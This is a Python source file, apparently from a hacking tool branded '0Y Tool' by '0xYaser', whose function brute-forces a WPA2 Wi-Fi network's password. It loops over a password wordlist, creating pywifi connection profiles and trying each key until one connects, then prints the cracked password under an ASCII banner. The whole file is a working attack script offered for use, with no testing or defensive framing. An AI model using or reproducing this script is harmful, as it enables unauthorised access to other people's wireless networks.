import datetime
import os
import time
from ftplib import FTP

import colorama
from pywifi import Profile, PyWiFi, const

color = colorama.Fore
date = datetime.datetime.now().time()


def check(host, pasfile):
    wifi = PyWiFi()
    INF = wifi.interfaces()[0]
    password = open(pasfile, "r").read().splitlines()
    Error = 0
    for passwd in password:
        prof = Profile()
        prof.ssid = host
        prof.auth = const.AUTH_ALG_OPEN
        prof.akm.append(const.AKM_TYPE_WPA2PSK)
        prof.cipher = const.CIPHER_TYPE_CCMP
        prof.key = passwd
        INF.remove_all_network_profiles()
        TEMP_PROF = INF.add_network_profile(prof)
        time.sleep(0.1)
        INF.connect(TEMP_PROF)
        time.sleep(0.4)
        if INF.status() == 4:
            if os.name == "posix":
                os.system("clear")

            elif os.name == "nt":
                os.system("cls")

            print(
                f"""{color.YELLOW}
                         ░▒▓████████▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░ 
                         ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░ 
{color.BLUE} 0Y Tool{color.YELLOW}                 ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░ 
                         ░▒▓█▓▒░░▒▓█▓▒░░▒▓██████▓▒░░▒▓█▓▒░ 
{color.GREEN} By : 0xYaser {color.YELLOW}           ░▒▓█▓▒░░▒▓█▓▒░  ░▒▓█▓▒░   ░▒▓█▓▒░ 
                         ░▒▓█▓▒░░▒▓█▓▒░  ░▒▓█▓▒░           
{color.WHITE} version [0.1] {color.YELLOW}          ░▒▓████████▓▒░  ░▒▓█▓▒░   ░▒▓█▓▒░ 

   """
            )
            print(
                f"\n{color.WHITE}[{color.BLUE}{date}{color.WHITE}] >> {color.GREEN}{host}{color.RED}:{color.GREEN}{passwd}{color.WHITE}\n"
            )
            break
        else:
            Error = Error + 1
            print(
                f"\r{color.WHITE}[{color.BLUE}{date}{color.WHITE}] [{color.RED}NOT TRUE {Error}{color.WHITE}] >> {host}:{passwd}{color.WHITE}",
                end="",
            )
